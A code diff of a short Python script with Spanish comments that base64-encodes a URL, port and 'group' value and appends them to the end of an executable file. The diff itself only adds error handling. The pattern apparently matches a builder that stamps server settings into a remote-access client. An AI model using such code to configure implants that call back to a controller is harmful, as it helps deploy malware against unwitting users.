@@ -1,3 +1,5 @@
+
+
 import argparse
 import base64
 import time
@@ -19,20 +21,21 @@ def parse_arguments():
 
 def add_text(ruta_ejecutable,  url, port, group):
 
-    text = f"|{url}|{port}|{group}"
+    try:
 
-    text_base = f"DATA={base64.b64encode(text.encode('utf-8')).decode('utf-8')}"
-    texto_bytes = text_base.encode('utf-16-le')
+        text = f"|{url}|{port}|{group}"
 
-    # Abrimos el archivo en modo binario y append (añadir al final)
+        text_base = f"DATA={base64.b64encode(text.encode('utf-8')).decode('utf-8')}"
+        texto_bytes = text_base.encode('utf-16-le')
 
-    time.sleep(2)
-    with open(ruta_ejecutable, 'ab') as f:
-        f.write(texto_bytes)
-    
-    print(text_base)
-    #print(texto_bytes)
-
+        time.sleep(2)
+        with open(ruta_ejecutable, 'ab') as f:
+            f.write(texto_bytes)
+        
+        print(text_base)
+    except Exception as e:
+        print(e)
+        
 def read_text(path):
 
     with open(path, 'rb') as f:
